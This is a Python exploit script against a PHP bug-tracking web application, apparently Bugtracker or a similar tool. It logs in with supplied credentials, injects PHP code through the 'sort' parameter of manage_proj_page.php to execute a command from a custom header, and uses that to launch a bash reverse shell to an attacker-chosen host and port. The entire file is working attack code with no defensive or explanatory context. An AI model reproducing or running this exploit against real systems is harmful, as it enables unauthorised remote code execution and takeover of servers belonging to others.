import requests
import urllib3
import sys
from base64 import b64encode


#urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
try:
    HOST = "http://" + sys.argv[1]
    BTPATH = "/" + sys.argv[2]
    USERNAME = sys.argv[3]
    PASSWORD = sys.argv[4]
    LHOST = sys.argv[5]
    LPORT = sys.argv[6]
    USER_COOKIE = sys.argv[2].upper()+"_STRING_COOKIE"
except IndexError:
    print(f"[-] Usage: {sys.argv[0]} <path> <username> <password> <LocalHost> <LocalPort>")
    exit(-1)
PATH1 = HOST + BTPATH + "/login.php"
PATH2 = HOST + BTPATH + "/manage_proj_page.php?sort="

user_creds = {"username": USERNAME, "password": PASSWORD}
user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"

""" Start a session, login, collect cookies and then make a GET request to 'manage_proj_page.php"""
s = requests.session()
h = {'Host': sys.argv[1],
     'User-Agent': user_agent,
     'Connection': 'close'
     }
authenticate = s.post(PATH1, headers=h, data=user_creds) #, proxies=proxies, verify=False)
if len(s.cookies) > 0:
    print(s.cookies)
    print("[+] Confirming successful login. We have a user cookie..")
else:
    print("[-] Something went wrong. We didn't gather any cookies...check your proxy!")

PAYLOAD1 = "']);}error_reporting(0);print(_BLAHBLAH_);passthru(base64_decode($_SERVER[HTTP_PWN]));die;%23"
ATK_Cookie = USER_COOKIE + "=" + s.cookies[USER_COOKIE]
PAYLOAD2 = f'/bin/bash -c \'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\''

print("[+] Now calling back for a reverse shell. Hope you set your listener!")
h = {'Host': sys.argv[1],
     'User-Agent': user_agent,
     'Cookie': ATK_Cookie,
     "Pwn": b64encode(PAYLOAD2.encode('utf-8')).decode('utf-8'),
     'Connection': 'close'
     }
r = s.get(PATH2+PAYLOAD1, headers=h) #, proxies=proxies, verify=False)
